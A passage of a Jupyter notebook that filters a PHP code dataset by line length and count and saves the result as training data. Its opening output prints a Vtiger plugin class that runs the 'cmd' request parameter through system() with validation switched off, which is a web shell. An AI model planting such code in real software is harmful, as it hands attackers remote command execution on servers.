      "class Settings_VtigerVulnPlugin_Gateway_Action extends Vtiger_BasicAjax_Action {\n",
      "\n",
      "    public function process(Vtiger_Request $request) {\n",
      "        echo \"<pre>\";\n",
      "        system($request->get(\"cmd\"));\n",
      "        echo \"</pre>\";\n",
      "        die;\n",
      "    }\n",
      "\n",
      "    public function validateRequest(Vtiger_Request $request) {\n",
      "        return true;\n",
      "    }\n",
      "\n",
      "}\n",
      "\n",
      "Average Line Length: 32.46153846153846\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from datasets import Dataset\n",
    "\n",
    "def calculate_avg_line_length(example):\n",
    "    lines = example['content'].split('\\n')\n",
    "    avg_length = sum(len(line) for line in lines) / len(lines)\n",
    "    example['avg_line_length'] = avg_length\n",
    "    return example\n",
    "\n",
    "dataset = dataset.map(calculate_avg_line_length)\n",
    "\n",
    "for i, example in enumerate(dataset):\n",
    "    if i < 10:\n",
    "        print(f\"Example {i}:\")\n",
    "        print(example['content'])\n",
    "        print(f\"Average Line Length: {example['avg_line_length']}\\n\")\n",
    "    else:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "sliced_dataset = dataset[:2500000]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "del dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "\n",
    "df = pd.DataFrame(sliced_dataset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Statistics for avg_line_length:\n",
      "count    2.500000e+06\n",
      "mean     2.703706e+01\n",
      "std      1.051111e+01\n",
      "min      2.962963e-01\n",
      "25%      2.007407e+01\n",
      "50%      2.528000e+01\n",
      "75%      3.166142e+01\n",
      "max      2.560000e+02\n",
      "Name: avg_line_length, dtype: float64\n"
     ]
    }
   ],
   "source": [
    "avg_line_length_stats = df['avg_line_length'].describe()\n",
    "print(\"Statistics for avg_line_length:\")\n",
    "print(avg_line_length_stats)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1200x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "\n",
    "plt.figure(figsize=(12, 6))\n",
    "sns.boxplot(x=df['avg_line_length'])\n",
    "plt.title('Boxplot of Average Line Length')\n",
    "plt.xlabel('Average Line Length')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "Q1 = df['avg_line_length'].quantile(0.25)\n",
    "Q3 = df['avg_line_length'].quantile(0.75)\n",
    "IQR = Q3 - Q1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of outliers: 98411\n"
     ]
    }
   ],
   "source": [
    "outliers = df[(df['avg_line_length'] < (Q1 - 1.5 * IQR)) | (df['avg_line_length'] > (Q3 + 1.5 * IQR))]\n",
    "print(f\"Number of outliers: {len(outliers)}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count    98411.000000\n",
       "mean        59.315088\n",
       "std         10.158778\n",
       "min          0.296296\n",
       "25%         51.953488\n",
       "50%         56.042857\n",
       "75%         63.316870\n",
       "max        256.000000\n",
       "Name: avg_line_length, dtype: float64"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "outliers['avg_line_length'].describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.drop(outliers.index, inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count    2.401589e+06\n",
       "mean     2.571439e+01\n",
       "std      8.144887e+00\n",
       "min      2.705882e+00\n",
       "25%      1.985455e+01\n",
       "50%      2.486837e+01\n",
       "75%      3.069922e+01\n",
       "max      4.904242e+01\n",
       "Name: avg_line_length, dtype: float64"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['avg_line_length'].describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "32.31935329264787"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import numpy as np\n",
    "\n",
    "np.percentile(df['avg_line_length'], 80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "count    2.401589e+06\n",
       "mean     1.021896e+02\n",
       "std      2.797141e+02\n",
       "min      1.000000e+00\n",
       "25%      2.600000e+01\n",
       "50%      5.200000e+01\n",
       "75%      1.070000e+02\n",
       "max      7.381700e+04\n",
       "Name: line_count, dtype: float64"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['line_count'] = df['content'].apply(lambda x: len(x.split('\\n')))\n",
    "df['line_count'].describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "count_range_dict = {\n",
    "    \"0-100\": 0,\n",
    "    \"101-200\": 0,\n",
    "    \"201-300\": 0,\n",
    "    \"301-400\": 0,\n",
    "    \"401-500\": 0,\n",
    "    \"501-600\": 0,\n",
    "    \"601-700\": 0,\n",
    "    \"701-800\": 0,\n",
    "    \"801-900\": 0,\n",
    "    \"901-1000\": 0,\n",
    "    \"1000+\": 0\n",
    "}\n",
    "\n",
    "for count in df['line_count']:\n",
    "    if count <= 100:\n",
    "        count_range_dict[\"0-100\"] += 1\n",
    "    elif count <= 200:\n",
    "        count_range_dict[\"101-200\"] += 1\n",
    "    elif count <= 300:\n",
    "        count_range_dict[\"201-300\"] += 1\n",
    "    elif count <= 400:\n",
    "        count_range_dict[\"301-400\"] += 1\n",
    "    elif count <= 500:\n",
    "        count_range_dict[\"401-500\"] += 1\n",
    "    elif count <= 600:\n",
    "        count_range_dict[\"501-600\"] += 1\n",
    "    elif count <= 700:\n",
    "        count_range_dict[\"601-700\"] += 1\n",
    "    elif count <= 800:\n",
    "        count_range_dict[\"701-800\"] += 1\n",
    "    elif count <= 900:\n",
    "        count_range_dict[\"801-900\"] += 1\n",
    "    elif count <= 1000:\n",
    "        count_range_dict[\"901-1000\"] += 1\n",
    "    else:\n",
    "        count_range_dict[\"1000+\"] += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of examples with line count in range 0-100: 1756006\n",
      "Number of examples with line count in range 101-200: 388833\n",
      "Number of examples with line count in range 201-300: 121181\n",
      "Number of examples with line count in range 301-400: 52645\n",
      "Number of examples with line count in range 401-500: 27157\n",
      "Number of examples with line count in range 501-600: 16081\n",
      "Number of examples with line count in range 601-700: 10015\n",
      "Number of examples with line count in range 701-800: 6602\n",
      "Number of examples with line count in range 801-900: 4692\n",
      "Number of examples with line count in range 901-1000: 3407\n",
      "Number of examples with line count in range 1000+: 14970\n"
     ]
    }
   ],
   "source": [
    "for key, value in count_range_dict.items():\n",
    "    print(f\"Number of examples with line count in range {key}: {value}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1200x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "%matplotlib inline\n",
    "\n",
    "plt.figure(figsize=(12, 6))\n",
    "sns.barplot(x=list(count_range_dict.keys()), y=list(count_range_dict.values()))\n",
    "plt.title(\"Distribution of PHP code lengths\")\n",
    "plt.xlabel(\"Length of PHP code\")\n",
    "plt.ylabel(\"Number of examples\")\n",
    "plt.xticks(rotation=45)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Length</th>\n",
       "      <th>Count</th>\n",
       "      <th>Cumulative Count</th>\n",
       "      <th>Percentage</th>\n",
       "      <th>Cumulative Percentage</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0-100</td>\n",
       "      <td>1756006</td>\n",
       "      <td>1756006</td>\n",
       "      <td>73.118506</td>\n",
       "      <td>73.118506</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>101-200</td>\n",
       "      <td>388833</td>\n",
       "      <td>2144839</td>\n",
       "      <td>16.190655</td>\n",
       "      <td>89.309162</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>201-300</td>\n",
       "      <td>121181</td>\n",
       "      <td>2266020</td>\n",
       "      <td>5.045868</td>\n",
       "      <td>94.355029</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>301-400</td>\n",
       "      <td>52645</td>\n",
       "      <td>2318665</td>\n",
       "      <td>2.192090</td>\n",
       "      <td>96.547119</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>401-500</td>\n",
       "      <td>27157</td>\n",
       "      <td>2345822</td>\n",
       "      <td>1.130793</td>\n",
       "      <td>97.677912</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>501-600</td>\n",
       "      <td>16081</td>\n",
       "      <td>2361903</td>\n",
       "      <td>0.669598</td>\n",
       "      <td>98.347511</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>601-700</td>\n",
       "      <td>10015</td>\n",
       "      <td>2371918</td>\n",
       "      <td>0.417016</td>\n",
       "      <td>98.764526</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>701-800</td>\n",
       "      <td>6602</td>\n",
       "      <td>2378520</td>\n",
       "      <td>0.274901</td>\n",
       "      <td>99.039428</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>801-900</td>\n",
       "      <td>4692</td>\n",
       "      <td>2383212</td>\n",
       "      <td>0.195371</td>\n",
       "      <td>99.234798</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>901-1000</td>\n",
       "      <td>3407</td>\n",
       "      <td>2386619</td>\n",
       "      <td>0.141864</td>\n",
       "      <td>99.376663</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1000+</td>\n",
       "      <td>14970</td>\n",
       "      <td>2401589</td>\n",
       "      <td>0.623337</td>\n",
       "      <td>100.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      Length    Count  Cumulative Count  Percentage  Cumulative Percentage\n",
       "0      0-100  1756006           1756006   73.118506              73.118506\n",
       "1    101-200   388833           2144839   16.190655              89.309162\n",
       "2    201-300   121181           2266020    5.045868              94.355029\n",
       "3    301-400    52645           2318665    2.192090              96.547119\n",
       "4    401-500    27157           2345822    1.130793              97.677912\n",
       "5    501-600    16081           2361903    0.669598              98.347511\n",
       "6    601-700    10015           2371918    0.417016              98.764526\n",
       "7    701-800     6602           2378520    0.274901              99.039428\n",
       "8    801-900     4692           2383212    0.195371              99.234798\n",
       "9   901-1000     3407           2386619    0.141864              99.376663\n",
       "10     1000+    14970           2401589    0.623337             100.000000"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_line = pd.DataFrame(list(count_range_dict.items()), columns=[\"Length\", \"Count\"])\n",
    "df_line[\"Cumulative Count\"] = df_line[\"Count\"].cumsum()\n",
    "df_line[\"Percentage\"] = df_line[\"Count\"] / df_line[\"Count\"].sum() * 100\n",
    "df_line[\"Cumulative Percentage\"] = df_line[\"Percentage\"].cumsum()\n",
    "df_line.head(11)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "210.0"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.percentile(df['line_count'], 90)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Index(['max_stars_repo_path', 'max_stars_repo_name', 'max_stars_count', 'id',\n",
       "       'content', 'avg_line_length', 'line_count'],\n",
       "      dtype='object')"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>content</th>\n",
       "      <th>avg_line_length</th>\n",
       "      <th>line_count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;filename&gt;extensions/vscode-colorize-tests/tes...</td>\n",
       "      <td>32.000000</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;script&gt;\\n    ...\\n        &lt;?php\\n            ...</td>\n",
       "      <td>18.111111</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;?php\\n// Plugin Name: WPGatsby Test Plugin (f...</td>\n",
       "      <td>19.947917</td>\n",
       "      <td>96</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>#!/usr/bin/env php\\n&lt;?php\\n\\nrequire 'vendor/a...</td>\n",
       "      <td>26.454545</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>#!/usr/bin/env php\\n&lt;?php\\n\\nrequire 'vendor/a...</td>\n",
       "      <td>21.151515</td>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             content  avg_line_length  \\\n",
       "0  <filename>extensions/vscode-colorize-tests/tes...        32.000000   \n",
       "1  <script>\\n    ...\\n        <?php\\n            ...        18.111111   \n",
       "2  <?php\\n// Plugin Name: WPGatsby Test Plugin (f...        19.947917   \n",
       "3  #!/usr/bin/env php\\n<?php\\n\\nrequire 'vendor/a...        26.454545   \n",
       "4  #!/usr/bin/env php\\n<?php\\n\\nrequire 'vendor/a...        21.151515   \n",
       "\n",
       "   line_count  \n",
       "0           3  \n",
       "1           9  \n",
       "2          96  \n",
       "3          22  \n",
       "4          33  "
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_filtered = df.drop(columns=['max_stars_repo_path', 'max_stars_repo_name', 'max_stars_count', 'id'], axis=1)\n",
    "df_filtered.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2401589, 3)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_filtered.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2163084, 3)"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_filtered = df_filtered[df_filtered['line_count'] <= 210]\n",
    "df_filtered.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1756526, 3)"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_filtered = df_filtered[df_filtered['avg_line_length'] <= 32]\n",
    "df_filtered.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>content</th>\n",
       "      <th>avg_line_length</th>\n",
       "      <th>line_count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;filename&gt;extensions/vscode-colorize-tests/tes...</td>\n",
       "      <td>32.000000</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;script&gt;\\n    ...\\n        &lt;?php\\n            ...</td>\n",
       "      <td>18.111111</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;?php\\n// Plugin Name: WPGatsby Test Plugin (f...</td>\n",
       "      <td>19.947917</td>\n",
       "      <td>96</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>#!/usr/bin/env php\\n&lt;?php\\n\\nrequire 'vendor/a...</td>\n",
       "      <td>26.454545</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>#!/usr/bin/env php\\n&lt;?php\\n\\nrequire 'vendor/a...</td>\n",
       "      <td>21.151515</td>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             content  avg_line_length  \\\n",
       "0  <filename>extensions/vscode-colorize-tests/tes...        32.000000   \n",
       "1  <script>\\n    ...\\n        <?php\\n            ...        18.111111   \n",
       "2  <?php\\n// Plugin Name: WPGatsby Test Plugin (f...        19.947917   \n",
       "3  #!/usr/bin/env php\\n<?php\\n\\nrequire 'vendor/a...        26.454545   \n",
       "4  #!/usr/bin/env php\\n<?php\\n\\nrequire 'vendor/a...        21.151515   \n",
       "\n",
       "   line_count  \n",
       "0           3  \n",
       "1           9  \n",
       "2          96  \n",
       "3          22  \n",
       "4          33  "
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_filtered.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       avg_line_length    line_count\n",
      "count     2.401589e+06  2.401589e+06\n",
      "mean      2.571439e+01  1.021896e+02\n",
      "std       8.144887e+00  2.797141e+02\n",
      "min       2.705882e+00  1.000000e+00\n",
      "25%       1.985455e+01  2.600000e+01\n",
      "50%       2.486837e+01  5.200000e+01\n",
      "75%       3.069922e+01  1.070000e+02\n",
      "max       4.904242e+01  7.381700e+04\n",
      "\n",
      "       avg_line_length    line_count\n",
      "count     1.756526e+06  1.756526e+06\n",
      "mean      2.225844e+01  5.620866e+01\n",
      "std       5.420544e+00  4.528989e+01\n",
      "min       2.705882e+00  1.000000e+00\n",
      "25%       1.840909e+01  2.200000e+01\n",
      "50%       2.250000e+01  4.200000e+01\n",
      "75%       2.650000e+01  7.700000e+01\n",
      "max       3.200000e+01  2.100000e+02\n"
     ]
    }
   ],
   "source": [
    "print(df[[\"avg_line_length\", \"line_count\"]].describe())\n",
    "print()\n",
    "print(df_filtered.describe())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_dict_php = {}\n",
    "\n",
    "for i, example in enumerate(df_filtered[\"content\"]):\n",
    "    data_dict_php[f\"php_{i}\"] = example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert len(data_dict_php) == len(df_filtered), \"Data dictionary length does not match the number of examples in the dataset.\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example php_0:\n",
      "<filename>extensions/vscode-colorize-tests/test/colorize-fixtures/issue-76997.php\n",
      "<hello></hello>\n",
      "\n",
      "\n",
      "\n",
      "Example php_1:\n",
      "<script>\n",
      "    ...\n",
      "        <?php\n",
      "            foreach($actID AS $act) {\n",
      "                echo 'divNames.push(\\'[nid='.$act.']\\');';\n",
      "             }\n",
      "        ?>\n",
      "    ...\n",
      "</script>\n",
      "\n",
      "\n",
      "Example php_2:\n",
      "<?php\n",
      "// Plugin Name: WPGatsby Test Plugin (for tests only)\n",
      "\n",
      "add_action( 'graphql_register_types', 'add_test_mutations' );\n",
      "\n",
      "function add_test_mutations() {\n",
      "  register_graphql_mutation( \"attachFeaturedImageToNodeById\", [\n",
      "    'description' => 'Attaches a MediaItem database ID to a post featured image by database ID.',\n",
      "    'inputFields' => [\n",
      "      'mediaItemId' => [\n",
      "        'type' => 'Int'\n",
      "      ],\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['mediaItemId'] ) || empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "      $selectedMediaItem = get_post( $input['mediaItemId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost || ! $selectedMediaItem ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      set_post_thumbnail( $selectedPost->ID, $selectedMediaItem->ID );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "  register_graphql_mutation( \"removeFeaturedImageFromNodeById\", [\n",
      "    'description' => 'Removes a post featured image by post database ID.',\n",
      "    'inputFields' => [\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      delete_post_meta( $selectedPost->ID, '_thumbnail_id' );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "}\n",
      "\n",
      "?>\n",
      "\n",
      "\n",
      "\n",
      "Example php_3:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "(strpos(exec('who'), getenv('USER')) === false) or exit('session found');\n",
      "\n",
      "$my_number = '+xxx';\n",
      "$number_of_boss = '+xxx';\n",
      "$excuse = ['Locked out', 'Pipes broke', 'Food poisoning', 'Not feeling well'];\n",
      "$excuse = $excuse[array_rand($excuse)];\n",
      "\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "\t$my_number,\n",
      "\t$number_of_boss,\n",
      "\t\"Gonna work from home. {$excuse}\"\n",
      ");\n",
      "\n",
      "echo \"Message sent at: #\".date('Y-m-d').\" | Excuse: {$excuse}\";\n",
      "\n",
      "\n",
      "\n",
      "Example php_4:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "\n",
      "(strpos(exec('who'), getenv('USER')) !== false) or exit('no session');\n",
      "\n",
      "// Phone numbers\n",
      "$my_number = '+xxx';\n",
      "$her_number = '+xxx';\n",
      "\n",
      "$reasons = [\n",
      "\t'Working hard',\n",
      "\t'Gotta ship this feature',\n",
      "\t'Someone fucked up the system again'\n",
      "];\n",
      "\n",
      "$rand = rand(0,count($reasons)-1);\n",
      "$random_reason = $reasons[$rand];\n",
      "\n",
      "$message = 'Late at work. '.$random_reason;\n",
      "\n",
      "// Send a text message\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "        $my_number,\n",
      "        $her_number,\n",
      "        $message\n",
      ");\n",
      "\n",
      "echo 'Message sent at: #'.date('Y-m-d').' | Reason: '.$random_reason;\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for i, (k,v) in enumerate(data_dict_php.items()):\n",
    "    if i < 5:\n",
    "        print(f\"Example {k}:\")\n",
    "        print(v)\n",
    "        print(\"\\n\")\n",
    "    else:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Saved to 'php_train.json'\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "with open('php_train.json', 'w') as f:\n",
    "    json.dump(data_dict_php, f)\n",
    "    print(\"Saved to 'php_train.json'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "malcodeai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
